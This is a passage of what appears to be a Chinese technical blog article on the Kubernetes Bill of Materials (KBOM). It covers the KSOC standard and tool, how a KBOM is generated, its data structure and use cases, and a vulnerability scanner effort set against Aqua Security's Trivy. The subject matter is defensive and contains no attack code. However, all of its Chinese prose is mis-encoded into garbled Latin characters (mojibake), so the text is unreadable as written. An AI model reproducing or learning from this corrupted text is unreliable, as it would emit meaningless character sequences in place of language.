title="ï¼ˆä¸€ï¼‰é¦–ä¸ª KBOM æ ‡å‡†é¢å¸ƒ"></a>ï¼ˆä¸€ï¼‰é¦–ä¸ª KBOM æ ‡å‡†é¢å¸ƒ</h3><p>ä¸ºäº†æœ‰æ•ˆåº”å¯¹ Kubernetes ç»„ä»¶æ‰€é¢ä¸´çš„å®‰å…¨é£é™©ï¼ŒKubernetes å®‰å…¨è¿è¥ä¸­å¿ƒï¼ˆKubernetes Security Operations Centerï¼Œç®€ç§° KSOCï¼‰äº 2023 å¹´ 5 æœˆ 8 æ—¥å‘å¸ƒäº†é¦–ä¸ª Kubernetes ç‰©æ–™æ¸…å•ï¼ˆKubernetes Bill of Materialsï¼Œç®€ç§° KBOMï¼‰æ ‡å‡†ï¼Œå¹¶å¼€æºäº†å¯ä¸ºé›†ç¾¤è‡ªåŠ¨ç”Ÿæˆç‰©æ–™æ¸…å•çš„åä¸º <a href="https://github.com/rad-security/kbom">KBOM</a> çš„å·¥å…·ã€‚</p><p><img src="/image/678.webp" alt="å›¾ 5ï¼šé¦–ä¸ª KBOM ç”Ÿæˆå·¥å…·"></p><p>KBOM ä½œä¸ºä¸€ç§æ–°ç¡®ç«‹çš„æ ‡å‡†ï¼Œæ¯å½“è¢«æåŠæ—¶ï¼Œå¾€å¾€ä¼šä¸ Kubernetes çš„è½¯ä»¶ç‰©æ–™æ¸…å•ï¼ˆSoftware Bill of Materialsï¼Œç®€ç§° SBOMï¼‰ä¸€åŒè®¨è®ºï¼Œä»¥è¿›è¡ŒåŒºåˆ†å¹¶é¿å…æ··æ·†ã€‚</p><p>Kubernetes çš„ SBOM ä¾§é‡äºå•ä¸ªå®¹å™¨çš„å®‰å…¨æ€§ï¼Œä¸»è¦é€šè¿‡éå†å®¹å™¨é•œåƒçš„æ–‡ä»¶ç³»ç»Ÿï¼Œè§£æå…¶ä¸­çš„è½¯ä»¶åŒ…ä¿¡æ¯ï¼Œä»¥è¯†åˆ«å‡ºç³»ç»Ÿå±‚ä¸è½¯ä»¶å±‚çš„è½¯ä»¶åŒ…åŠå…¶ä¾èµ–å…³ç³»ã€‚</p><p>SBOM åœ¨æ³•è§„æ€§æ–‡ä»¶ä¸­å·²è¾ƒä¸ºæˆç†Ÿï¼Œæœ€æ—©åœ¨ 2014 å¹´ç¾å›½å›½ä¼šä¼—è®®é™¢çš„<a href="https://www.congress.gov/bill/113th-congress/house-bill/5793">ã€Šç½‘ç»œä¾›åº”é“¾ç®¡ç†ä¸é€æ˜åº¦æ³•æ¡ˆã€‹</a>ä¸­è¢«æåŠã€‚</p><p>ç›¸è¾ƒä¹‹ä¸‹ï¼ŒKBOM çš„èšç„¦äº Kubernetes å¹³å°æœ¬èº«çš„å®‰å…¨ã€‚ä¸»è¦é€šè¿‡å‘ API Server å‘é€ HTTP(S) è¯·æ±‚ï¼Œè§£ææ‰€å“åº”çš„ JSON æ•°æ®ï¼Œä»¥å¯¹é›†ç¾¤èµ„æºåŠå…¶è¿è¡Œçš„ç»„ä»¶ï¼ˆå¦‚ API Serverã€Etcd å’Œ Containerd ç­‰ï¼‰è¿›è¡Œæ”¶é›†ã€‚</p><p>KBOM ä½œä¸ºäº‘åŸç”Ÿå®‰å…¨ä¸ä¾›åº”é“¾å®‰å…¨äº¤å‰é¢†åŸŸçš„ä¸€é¡¹æ–°å…´æŠ€æœ¯ï¼Œåœ¨ 2023 å¹´<a href="https://rad.security/blog/ksoc-releases-the-first-kubernetes-bill-of-materials-kbom-standard">é¦–æ¬¡è¢«æå‡º</a>ã€‚</p><h3 id="ï¼ˆäºŒï¼‰KBOM-çš„ç”Ÿæˆ"><a href="#ï¼ˆäºŒï¼‰KBOM-çš„ç”Ÿæˆ" class="headerlink" title="ï¼ˆäºŒï¼‰KBOM çš„ç”Ÿæˆ"></a>ï¼ˆäºŒï¼‰KBOM çš„ç”Ÿæˆ</h3><p>ä¸ºäº†æ–¹ä¾¿å¼€å‘ä¸æµ‹è¯•ï¼Œåœ¨ç”Ÿæˆé›†ç¾¤çš„ KBOM çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å»ºè®®é‡‡ç”¨ <a href="https://github.com/kubernetes-sigs/kind">kind</a> å·¥å…·åœ¨æœ¬åœ°åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªé›†ç¾¤ã€‚</p><p><img src="/image/679.webp" alt="å›¾ 6ï¼šåœ¨æœ¬åœ°åˆ›å»ºå¹¶å¯åŠ¨æµ‹è¯•é›†ç¾¤"></p><p>éšåæ ¹æ®ç³»ç»Ÿæç¤ºï¼Œå¯¹é›†ç¾¤ä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚è‹¥è¦æ·±å…¥ç†è§£ API Server çš„äº¤äº’ç»†èŠ‚ï¼Œå¯å°†æ—¥å¿—çº§åˆ«è°ƒæ•´è‡³ 7 çº§ï¼Œä»¥ä¾¿è¯¦ç»†ç›‘æ§å’Œè®°å½• HTTP(S) æ•°æ®åŒ…çš„é€šä¿¡è¿‡ç¨‹ã€‚</p><p><img src="/image/680.webp" alt="å›¾ 7ï¼šæŸ¥çœ‹ API Server äº¤äº’è¿‡ç¨‹ä¸­çš„æ•°æ®åŒ…"></p><p>ç„¶åï¼Œä½¿ç”¨ Kubernetes æä¾›çš„å®¢æˆ·ç«¯åº“æ¥ç®¡ç†å’Œæ“ä½œé›†ç¾¤èµ„æºï¼Œä»¥æé«˜é›†ç¾¤ä¿¡æ¯è·å–çš„è‡ªåŠ¨åŒ–ç¨‹åº¦ã€‚ä¾‹å¦‚ï¼ŒGo è¯­è¨€çš„ k8s.io&#x2F;client-go åº“ä¾¿å°è£…äº†ä¸€ç³»åˆ—ä¸ Kubernetes API Server äº¤äº’çš„æ¥å£ï¼Œå¯å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨æ”¶é›†å…ƒæ•°æ®ã€èŠ‚ç‚¹ä¿¡æ¯ã€ç»„ä»¶ä¿¡æ¯ä»¥åŠé•œåƒä¿¡æ¯ã€‚</p><p>åœ¨æˆåŠŸè·å–åˆ°è¿™äº›ä¿¡æ¯åï¼Œåªéœ€è¿›ä¸€æ­¥å°†å…¶è½¬æ¢æˆ KSOC æ‰€å®šä¹‰çš„ <a href="https://github.com/rad-security/kbom/blob/main/internal/kube/kube.go">KBOM æ ‡å‡†æ ¼å¼</a>ï¼Œå³å¯å¯¹é›†ç¾¤è¿›è¡Œå®‰å…¨å®¡è®¡å’Œç®¡ç†ã€‚</p><p><img src="/image/681.webp" alt="å›¾ 8ï¼šè‡ªåŠ¨è·å–é›†ç¾¤ä¿¡æ¯çš„ä¸»è¦ä»£ç "></p><h3 id="ï¼ˆä¸‰ï¼‰KBOM-çš„æ•°æ®ç»“æ„"><a href="#ï¼ˆä¸‰ï¼‰KBOM-çš„æ•°æ®ç»“æ„" class="headerlink" title="ï¼ˆä¸‰ï¼‰KBOM çš„æ•°æ®ç»“æ„"></a>ï¼ˆä¸‰ï¼‰KBOM çš„æ•°æ®ç»“æ„</h3><p>KBOM åŒ…å«äº†é›†ç¾¤ä¿¡æ¯ã€èŠ‚ç‚¹ä¿¡æ¯ä»¥åŠç»„ä»¶ä¿¡æ¯ç­‰æ•°æ®ï¼Œæœ‰åŠ©äºç»„ç»‡å¯¹é›†ç¾¤çš„æ•´ä½“å®‰å…¨è¿›è¡Œè¯„ä¼°ã€‚</p><p>ä»¥æœ¬æ–‡ç¬¬ä¸€éƒ¨åˆ†æ‰€æåŠçš„ <a href="https://bestwing.me/CVE-2024-21626-container-escape.html">CVE-2024-21626</a> æ¼æ´ä¸ºä¾‹ï¼Œè¯¥æ¼æ´å¯¼è‡´å®¹å™¨é€ƒé€¸çš„ä¸»è¦åŸå› åœ¨äº runc åœ¨ä½¿ç”¨ openat2 ç³»ç»Ÿè°ƒç”¨æ—¶æœªèƒ½æ­£ç¡®å…³é—­æ–‡ä»¶æè¿°ç¬¦ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒLinux å†…æ ¸åœ¨ 5.6 ç‰ˆæœ¬ä¹‹å‰å¹¶æœªå®ç° openat2 ç³»ç»Ÿè°ƒç”¨ã€‚å› æ­¤ï¼Œè‹¥å®¹å™¨å¼•æ“è¿è¡Œåœ¨ 5.6 ç‰ˆæœ¬ä¹‹å‰çš„ Linux å†…æ ¸ä¸Šï¼Œé‚£ä¹ˆå®ƒå°†ä¸ä¼šå—åˆ°è¯¥æ¼æ´å½±å“ã€‚</p><p>ä¸ºäº†å¸®åŠ©ç»„ç»‡å¿«é€Ÿè¯„ä¼°å…¶é›†ç¾¤æ˜¯å¦å—æ­¤æ¼æ´å½±å“ï¼ŒKBOM æä¾›äº†å†…æ ¸ç‰ˆæœ¬å’Œå®¹å™¨è¿è¡Œæ—¶ç‰ˆæœ¬ç­‰å…³é”®ä¿¡æ¯ã€‚æ­¤å¤–ï¼ŒKBOM è¿˜æä¾›äº† Kubernetes ç‰ˆæœ¬ã€kubelet ç‰ˆæœ¬ã€kube-proxy ç‰ˆæœ¬ä»¥åŠå„ç»„ä»¶é•œåƒç­‰ä¿¡æ¯ï¼Œä»¥ä¾¿äºç»„ç»‡å¯¹é›†ç¾¤ç»„ä»¶å®‰å…¨è¿›è¡Œå¿«é€Ÿè¯„ä¼°ã€‚</p><p><img src="/image/682.webp" alt="å›¾ 9ï¼šKBOM çš„æ•°æ®å®ä¾‹å’Œæ•°æ®ç»“æ„"></p><p>å¦‚è¡¨ 4 æ‰€ç¤ºï¼Œåœ¨å¯¹ KBOM æ‰€åŒ…å«çš„ä¿¡æ¯è¿›è¡Œåˆ†æåï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°ï¼š</p><ul><li><p>ç›¸å¯¹äº<a href="https://about.gitlab.com/blog/2022/09/22/introducing-the-infrastructure-bill-of-materials/">åŸºç¡€è®¾æ–½ç‰©æ–™æ¸…å•ï¼ˆInfrastructure Bill of Materialï¼Œç®€ç§° IBOMï¼‰</a>ï¼ŒKBOM è¡¥å…¨äº† IBOM åœ¨ Kubernetes ç‰¹å®šå†…å®¹æ–¹é¢çš„ç¼ºå¤±ã€‚ä¾‹å¦‚ï¼šé›†ç¾¤ä¸­è¿è¡Œçš„å®¹å™¨é•œåƒä»¥åŠä¸ä¹‹äº¤äº’çš„ç¬¬ä¸‰æ–¹ç”Ÿæ€ç³»ç»Ÿä¿¡æ¯ã€‚</p></li><li><p>Kubernetes çš„ SBOM åˆ™ä»…é™äºé•œåƒçš„ç‰©æ–™æ¸…å•ï¼Œå®ƒå¹¶æœªåŒ…å«æ§åˆ¶å¹³é¢æˆ–è‡ªå®šä¹‰èµ„æºä¸­ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹é•œåƒä¿¡æ¯ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒKBOM å…³æ³¨äº Kubernetesï¼Œèƒ½å¤Ÿå…¨é¢æ¶µç›–é›†ç¾¤ä¸­çš„å„ä¸ªç»„ä»¶ï¼ŒåŒ…æ‹¬æ§åˆ¶å¹³é¢å’Œè‡ªå®šä¹‰èµ„æºã€‚åœ¨å¯¹é›†ç¾¤çš„ç»„ä»¶è¿›è¡Œå®‰å…¨è¯„ä¼°æ—¶ï¼Œèƒ½å¤Ÿè¿…é€Ÿåœ°è¯†åˆ«å‡ºç›¸å…³çš„ CVE æ¼æ´ã€‚</p></li></ul><p>è¡¨ 4:0.3.1 ç‰ˆæœ¬çš„ KBOM æ‰€åŒ…å«çš„æœ€æ–°ä¿¡æ¯ï¼ˆæˆªæ­¢è‡³ 2024 å¹´ 12 æœˆ 30 æ—¥ï¼‰</p><table><thead><tr><th><strong>ç±»å‹</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>æ€»å®¹é‡ï¼ˆCapacityï¼‰</td><td>CPUã€å†…å­˜ã€Pods ä»¥åŠä¸´æ—¶å­˜å‚¨ç­‰èµ„æºä¿¡æ¯</td></tr><tr><td>é›†ç¾¤ä¿¡æ¯ï¼ˆClusterï¼‰</td><td>é›†ç¾¤åç§°ã€CA è¯ä¹¦æ‘˜è¦ã€Kubernetes ç‰ˆæœ¬ã€CNI ç‰ˆæœ¬ã€åœ°ç†ä½ç½®ã€èŠ‚ç‚¹æ•°ã€èŠ‚ç‚¹ä¿¡æ¯ä»¥åŠç»„ä»¶ä¿¡æ¯ç­‰</td></tr><tr><td>ç»„ä»¶ä¿¡æ¯ï¼ˆComponentsï¼‰</td><td>é•œåƒä¿¡æ¯å’Œèµ„æºä¿¡æ¯ç­‰</td></tr><tr><td>é•œåƒä¿¡æ¯ï¼ˆImageï¼‰</td><td>é•œåƒçš„å®Œæ•´åç§°ã€åç§°ã€ç‰ˆæœ¬å’Œ digest ç­‰ä¿¡æ¯</td></tr><tr><td>å·¥å…·ä¿¡æ¯ï¼ˆToolï¼‰</td><td>å·¥å…·ä¾›åº”å•†ã€åç§°ã€æ„å»ºæ—¶é—´ã€ç‰ˆæœ¬ã€æäº¤ ID ä»¥åŠæäº¤æ—¶é—´ç­‰ä¿¡æ¯</td></tr><tr><td>èµ„æºä¿¡æ¯ï¼ˆResourceï¼‰</td><td>èµ„æºç§ç±»ã€API ç‰ˆæœ¬ã€åç§°ã€å‘½åç©ºé—´ä»¥åŠé™„åŠ å±æ€§ç­‰ä¿¡æ¯</td></tr><tr><td>èµ„æºåˆ—è¡¨ï¼ˆResource Listï¼‰</td><td>èµ„æºçš„ç§ç±»ã€API ç‰ˆæœ¬ã€æ˜¯å¦æ˜¯å‘½åç©ºé—´ã€èµ„æºè®¡æ•°ã€å…·ä½“èµ„æºç­‰ä¿¡æ¯</td></tr><tr><td>èŠ‚ç‚¹ä¿¡æ¯ï¼ˆNodeï¼‰</td><td>èŠ‚ç‚¹çš„åç§°ã€ç±»å‹ã€ä¸»æœºåã€å®¹é‡ã€åˆ†é…å®¹é‡ã€æ ‡ç­¾ã€æ³¨è§£ã€æœºå™¨ IDã€æ¶æ„ã€å®¹å™¨è¿è¡Œæ—¶ç‰ˆæœ¬ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯</td></tr><tr><td>é›†ç¾¤ä½ç½®ï¼ˆLocationï¼‰</td><td>é›†ç¾¤ä½ç½®çš„åç§°ã€åŒºåŸŸå’Œå¯ç”¨åŒºç­‰ä¿¡æ¯</td></tr></tbody></table><h3 id="ï¼ˆå››ï¼‰KBOM-çš„ä½¿ç”¨åœºæ™¯"><a href="#ï¼ˆå››ï¼‰KBOM-çš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="ï¼ˆå››ï¼‰KBOM çš„ä½¿ç”¨åœºæ™¯"></a>ï¼ˆå››ï¼‰KBOM çš„ä½¿ç”¨åœºæ™¯</h3><p>å¯¹ KBOM çš„æ•°æ®ç»“æ„è¿›è¡Œåˆ†æåï¼Œæˆ‘ä»¬å¯å°† KBOM çš„ä½¿ç”¨åœºæ™¯å½’çº³ä¸ºè·¨å›¢é˜Ÿå…±äº«é›†ç¾¤é…ç½®å’Œå¿«é€Ÿè¯†åˆ«é›†ç¾¤ä¸­çš„ CVE æ¼æ´ä¸¤æ–¹é¢ã€‚</p><p>å°½ç®¡ Kubernetes è¢«èª‰ä¸ºäº‘æ“ä½œç³»ç»Ÿï¼Œä½†å…¶å§‹ç»ˆç¼ºä¹ä¸€ç§é«˜æ•ˆçš„æœºåˆ¶æ¥è·¨å›¢é˜Ÿå…±äº«é›†ç¾¤é…ç½®åŠå…¶å‚æ•°ã€‚</p><p>ä¸ºæ­¤ï¼ŒKBOM æä¾›äº†ä¸€ç§é€šç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ç”¨äºå…±äº«é›†ç¾¤çš„ç‰©æ–™æ¸…å•ã€‚</p><p>å®ƒè¯¦å°½åœ°é˜è¿°äº†é›†ç¾¤çš„æ‰˜ç®¡æ¨¡å‹ã€èŠ‚ç‚¹æ•°é‡ã€å¯¹è±¡ä¿¡æ¯ã€å…¬å…±é•œåƒä»¥åŠè‡ªå®šä¹‰é•œåƒç­‰å…³é”®ç»†èŠ‚ï¼Œä»è€Œèƒ½å¤Ÿç²¾ç¡®åœ°æç»˜å‡ºé›†ç¾¤çš„å…¨è²Œï¼Œæœ‰åŠ©äºå›¢é˜Ÿæˆå‘˜ä¹‹é—´å°±é›†ç¾¤çš„æˆæœ¬ã€åˆè§„æ€§å’Œå®‰å…¨æ€§è¿›è¡Œæ›´ä¸ºæ·±å…¥çš„è®¨è®ºå’Œå†³ç­–ã€‚</p><p>å¦å¤–ï¼Œç”±äº Kubernetes çš„è®¸å¤šç¬¬ä¸‰æ–¹ç»„ä»¶éƒ½æ˜¯å¼€æºçš„ï¼Œå¹¶ä¸”å®ƒä»¬é€šå¸¸ä¼šåœ¨å…¶ä»£ç ä»“åº“ä¸­å‘å¸ƒå®‰å…¨å…¬å‘Šã€‚</p><p>ç»„ç»‡å¯é€šè¿‡ç›‘æ§è¿™äº›æ•°æ®æ¥ä¿æŒå¯¹ç»„ä»¶å®‰å…¨é£é™©çš„è­¦æƒ•æ€§ã€‚é€šè¿‡ä» KBOM ä¸­æå–å‡ºç»„ä»¶çš„ç‰ˆæœ¬å’Œé…ç½®ä¿¡æ¯ï¼Œç»„ç»‡å¯å¿«é€Ÿå¯¹é›†ç¾¤ç»„ä»¶è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼Œä»è€ŒåŠæ—¶å‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´å¹¶é‡‡å–ç›¸åº”çš„ä¿®å¤æªæ–½ã€‚</p><p>è¿™ç§æ–¹æ³•æå¤§åŠ å¿«äº†æ¼æ´çš„æ£€æµ‹å’Œå“åº”è¿‡ç¨‹ï¼Œä»è€Œæé«˜äº†é›†ç¾¤çš„æ•´ä½“å®‰å…¨æ°´å¹³ã€‚</p><h3 id="ï¼ˆäº”ï¼‰æ€»ç»“"><a href="#ï¼ˆäº”ï¼‰æ€»ç»“" class="headerlink" title="ï¼ˆäº”ï¼‰æ€»ç»“"></a>ï¼ˆäº”ï¼‰æ€»ç»“</h3><p>ä¸ºäº†ç¼“è§£ Kubernetes ç»„ä»¶å®‰å…¨ï¼ŒKSOC äº 2023 å¹´å‘å¸ƒäº†é¦–ä¸ª KBOM æ ‡å‡†å¹¶å¼€æºäº†å¯è‡ªåŠ¨ç”Ÿæˆ KBOM çš„å¼€æºå·¥å…·ã€‚</p><p>KBOM èšç„¦äº Kubernetes å¹³å°çš„æ•´ä½“å®‰å…¨ï¼Œå¼¥è¡¥äº† IBOM å’Œ Kubernetes SBOM çš„ä¸è¶³ï¼Œæ›´é€‚åˆè·¨å›¢é˜Ÿå…±äº«é›†ç¾¤é…ç½®ä»¥åŠé›†ç¾¤ç»„ä»¶æ¼æ´æ£€æµ‹ã€‚</p><h2 id="å››ã€KBOM-æ¼æ´æ‰«æå™¨"><a href="#å››ã€KBOM-æ¼æ´æ‰«æå™¨" class="headerlink" title="å››ã€KBOM æ¼æ´æ‰«æå™¨"></a>å››ã€KBOM æ¼æ´æ‰«æå™¨</h2><h3 id="ï¼ˆä¸€ï¼‰æ¼æ´æ‰«æåŸç†"><a href="#ï¼ˆä¸€ï¼‰æ¼æ´æ‰«æåŸç†" class="headerlink" title="ï¼ˆä¸€ï¼‰æ¼æ´æ‰«æåŸç†"></a>ï¼ˆä¸€ï¼‰æ¼æ´æ‰«æåŸç†</h3><p>åœ¨æ·±å…¥æ¢è®¨äº† KBOM çš„æ¦‚å¿µåŠå…¶åº”ç”¨åœºæ™¯ä¹‹åï¼Œæˆ‘ä»¬å°†ä»¥å¼€å‘ KBOM æ¼æ´æ‰«æå·¥å…·ä½œä¸ºæˆ‘ä»¬çš„ä¸»è¦å®è·µç›®æ ‡ã€‚</p><p>å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ GitHub çš„ REST API æ¥å£æ¥è·å–<a href="https://github.com/miao2sec/collect-cloud-native-sec-vuln">å®‰å…¨å…¬å‘Šæ•°æ®</a>ï¼Œè¿›è€Œæå–å‡ºå—æ¼æ´å½±å“çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶å°†å…¶ä¸é›†ç¾¤ KBOM ä¸­çš„ç‰ˆæœ¬ä¿¡æ¯è¿›è¡Œæ¯”å¯¹ã€‚</p><p>ç„¶è€Œï¼Œä¸ CNCF çš„å¤§å¤šå¼€æºç»„ä»¶ä¸åŒçš„æ˜¯ï¼ŒKubernetes çš„å®‰å…¨å…¬å‘Šæ•°æ®ä¸ºéç»“æ„åŒ–æ•°æ®ï¼Œä¸»è¦å­˜å‚¨åœ¨ Github Issue ä¸­ï¼Œå¹¶è¢«æ‰“ä¸Šâ€œofficial-cve-feedâ€æ ‡ç­¾ã€‚</p><p>å› æ­¤ï¼Œåœ¨å®éªŒéªŒè¯æˆåŠŸä¹‹åï¼Œæˆ‘ä»¬æŠ•å…¥äº†å¤§é‡æ—¶é—´ç ”ç©¶å¦‚ä½•è‡ªåŠ¨åŒ–å¤„ç†è¿™äº›éç»“æ„åŒ–çš„å®‰å…¨å…¬å‘Šæ•°æ®ã€‚</p><p><img src="/image/683.webp" alt="å›¾ 10:Kubernetes çš„éç»“æ„åŒ–å®‰å…¨å…¬å‘Šæ•°æ®ï¼ˆå·¦ï¼‰ä¸ Containerd çš„ç»“æ„åŒ–å®‰å…¨å…¬å‘Šæ•°æ®ï¼ˆå³ï¼‰"></p><h3 id="ï¼ˆäºŒï¼‰åˆä¸€ä¸ª-KBOM-æ¦‚å¿µæå‡º"><a href="#ï¼ˆäºŒï¼‰åˆä¸€ä¸ª-KBOM-æ¦‚å¿µæå‡º" class="headerlink" title="ï¼ˆäºŒï¼‰åˆä¸€ä¸ª KBOM æ¦‚å¿µæå‡º"></a>ï¼ˆäºŒï¼‰åˆä¸€ä¸ª KBOM æ¦‚å¿µæå‡º</h3><p>è¿™æ—¶ï¼Œ<a href="https://www.aquasec.com/blog/introducing-kbom-kubernetes-bill-of-materials/">Aqua Security æ¨å‡ºäº†æ–°çš„ KBOM æ¦‚å¿µ</a>ï¼Œä¸»è¦ä»å…³é”®ç»„ä»¶è§†è§’å¯¹é›†ç¾¤ä¿¡æ¯è¿›è¡Œæœé›†ï¼Œæ¶µç›–äº†æ§åˆ¶å¹³é¢ç»„ä»¶ã€èŠ‚ç‚¹ç»„ä»¶ä»¥åŠæ’ä»¶ç»„ä»¶ã€‚Aqua Security å¹¶ä¸å°† KBOM è§†ä¸ºæ–°æ ‡å‡†ï¼Œè€Œæ˜¯è®¤ä¸ºå®ƒåº”ä¸å…¶ä»– BOM æ ¼å¼å…¼å®¹ï¼Œå¹¶è®¡åˆ’å°† KBOM å®‰å…¨æ‰«æåŠŸèƒ½é›†æˆåˆ°å¼€æºå·¥å…· Trivy ä¸­ã€‚</p><p><img src="/image/684.webp" alt="å›¾ 11ï¼šAuqa Security å‘å¸ƒçš„ KBOM æ¦‚å¿µ"></p><p>æ¬¡æ—¥ï¼Œæˆ‘ä»¬ä¸ Aqua Security çš„å¼€æºå‰¯æ€»è£ã€CNCF å¤§ä½¿ Itay Shakury å°± KBOM çš„ç›¸å…³é—®é¢˜è¿›è¡Œäº†æ·±å…¥äº¤æµã€‚åœ¨å¯¹è¯ä¸­ï¼ŒAqua Security è¡¨è¾¾äº†ä»–ä»¬çš„æ„¿æ™¯ï¼šå¸Œæœ› Trivy èƒ½å¤Ÿæä¾›åŸç”Ÿçš„ KBOM ç”ŸæˆåŠŸèƒ½ï¼Œæ­£å¦‚å¸‚é¢ä¸Šå·²æœ‰å¤šç§å·¥å…·èƒ½å¤Ÿç”Ÿæˆ SBOMï¼Œä½† Trivy ä¾ç„¶æä¾›äº†åŸç”Ÿçš„ SBOM ç”ŸæˆåŠŸèƒ½ã€‚æ­¤å¤–ï¼Œä»–ä»¬åœ¨ç ”ç©¶ KBOM ä¹‹åˆï¼ŒKSOC å°šæœªå‘å¸ƒ KBOM çš„æ ‡å‡†ï¼Œä»–ä»¬è®¤ä¸º KBOM åº”ä½œä¸ºä¸€ä¸ªæ¦‚å¿µè€Œéæ ‡å‡†ï¼Œå¹¶åº”ä¸ CycloneDX æ ¼å¼å…¼å®¹ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä»–ä»¬åæ¥ä»å°è¯•ä¸ KSOC å›¢é˜Ÿå–å¾—è”ç³»ï¼Œä½†ç”±äºç§ç§åŸå› ï¼Œæœªèƒ½å®ç°åˆä½œã€‚</p><p>åœ¨äº¤æµè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°é—®é¢˜å…³é”®ç‚¹å¯èƒ½åœ¨äºï¼šAqua Security åœ¨å¼€å±•ç›¸å…³å·¥ä½œæ—¶ï¼ŒKSOC å°šæœªå‘å¸ƒ KBOM çš„æ ‡å‡†ã€‚è¿™ä¸€ç‚¹åœ¨ä¸ Itay çš„åˆæ¬¡äº¤æµä¸­å¯è§ä¸€æ–‘ï¼Œä»–æœ€åˆä»…å°± Kubernetes SBOM ä¸ KBOM çš„åŒºåˆ«è¿›è¡Œäº†å›å¤ã€‚åœ¨å¾—çŸ¥ KSOC å‘å¸ƒçš„ KBOM æ ‡å‡†å’Œå·¥å…·åï¼Œä»–åˆ é™¤äº†åŸå…ˆçš„å›å¤ï¼Œå¹¶åœ¨ä¸¤å¤©åé‡æ–°ä½œå‡ºå›åº”ï¼Œæ­¤æ—¶ä»–ä»¬å°šä¸çŸ¥ KSOC å·²æ”¯æŒ CycloneDX æ ¼å¼ã€‚</p><p><img src="/image/685.webp" alt="å›¾ 12ï¼šä¸ Aqua Security çš„å¼€æºå‰¯æ€»è£ã€CNCF å¤§ä½¿ Itay Shakury å°± KBOM è¿›è¡Œäº†äº¤æµ"></p><p>åœ¨æœ¬æ¬¡äº¤æµè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åˆæ­¥è®¤è¯†åˆ° KBOM ä¸ä»…åœ¨è§„èŒƒç®¡ç†ã€æ•°æ®æ ¼å¼åŠæ ‡å‡†æ–‡ä»¶æ–¹é¢å­˜åœ¨ç¼ºå¤±ï¼Œä¸”åœ¨å®£ä¼ æ¨å¹¿ã€èµ„æ–™å‡†å¤‡ã€ç¤¾åŒºåŠç”Ÿæ€æ”¯æŒæ–¹é¢äº¦æ˜¾ä¸è¶³ã€‚</p><p>ä¸ºé˜²æ­¢ç±»ä¼¼çŠ¶å†µå†æ¬¡å‡ºç°ï¼Œå¹¶è€ƒè™‘åˆ° Aqua Security æ‹¥æœ‰æ›´ä¸ºå……æ²›çš„äººåŠ›ä»¥åŠä¸°å¯Œçš„äº‘åŸç”Ÿå®‰å…¨ç»éªŒï¼Œæˆ‘ä»¬å†³å®šæš‚ç¼“ç›¸å…³é¡¹ç›®å·¥ä½œã€‚æ­¤ä¸¾æ—¨åœ¨è§‚å¯Ÿ Aqua Security å…·ä½“å¦‚ä½•å®šä¹‰ KBOM å¹¶å°†å…¶è¿›è¡Œè½åœ°å’Œåº”ç”¨ã€‚</p><p>2023 å¹´ 10 æœˆ 14 æ—¥ï¼Œ<a href="https://github.com/aquasecurity/trivy/discussions/5377">é¦–ä¸ª KBOM æ¼æ´æ‰«æåŠŸèƒ½åœ¨å¼€æºå·¥å…· Trivy ä¸­å¾—ä»¥å®ç°</a>ã€‚Trivy é¦–å…ˆéœ€è¦ä¸ºé›†ç¾¤ç”Ÿæˆ CycloneDX æ ¼å¼çš„ KBOMï¼Œéšååˆ©ç”¨å…¶ SBOM æ‰«æåŠŸèƒ½å¯¹ç”Ÿæˆçš„ KBOM è¿›è¡Œæ¼æ´æ£€æµ‹ã€‚</p><p>ä¸æˆ‘ä»¬çš„é¢„æœŸæœ‰æ‰€å·®å¼‚çš„æ˜¯ï¼šTrivy å½“å‰çš„ KBOM æ‰«æåŠŸèƒ½ä¸»è¦å±€é™äº API Serverã€Kubelet ä»¥åŠ Kube Proxy ç­‰æ ¸å¿ƒç»„ä»¶ã€‚å¯¹äºæˆ‘ä»¬æ‰€å…³æ³¨çš„ Kubernetes ç¬¬ä¸‰æ–¹ç”Ÿæ€ç»„ä»¶çš„æ¼æ´æ£€æµ‹å´å°šæœªæ¶µç›–ã€‚å±•æœ›æœªæ¥ï¼Œæˆ‘ä»¬ä»éœ€åœ¨ KBOM æ¼æ´æ£€æµ‹é¢†åŸŸæŠ•å…¥å¤§é‡å·¥ä½œã€‚</p><h3 id="ï¼ˆä¸‰ï¼‰æ€»ç»“-2"><a href="#ï¼ˆä¸‰ï¼‰æ€»ç»“-2" class="headerlink" title="ï¼ˆä¸‰ï¼‰æ€»ç»“"></a>ï¼ˆä¸‰ï¼‰æ€»ç»“</h3><p>åœ¨æ·±å…¥æ¢è®¨äº† KBOM çš„æ¦‚å¿µåŠå…¶åº”ç”¨åœºæ™¯ä¹‹åï¼Œæˆ‘ä»¬å¼€å§‹äº† KBOM æ¼æ´æ‰«æå™¨çš„å¼€å‘å·¥ä½œã€‚ç„¶è€Œï¼Œå¼€å‘è¿‡ç¨‹äº¦å­˜åœ¨è®¸å¤šæŒ‘æˆ˜ï¼Œä¾‹å¦‚ï¼Œè¯¥å¦‚ä½•è‡ªåŠ¨å¤„ç†éç»“æ„åŒ–çš„å®‰å…¨å…¬å‘Šæ•°æ®ã€‚</p><p>åœ¨æ­¤æœŸé—´ï¼ŒAqua Security æå‡ºäº† KBOM çš„æ–°ç†å¿µï¼Œå¹¶å‘å¸ƒäº†é¦–ä¸ª KBOM æ¼æ´æ‰«æå™¨ã€‚é€šè¿‡ä¸ Aqua Security 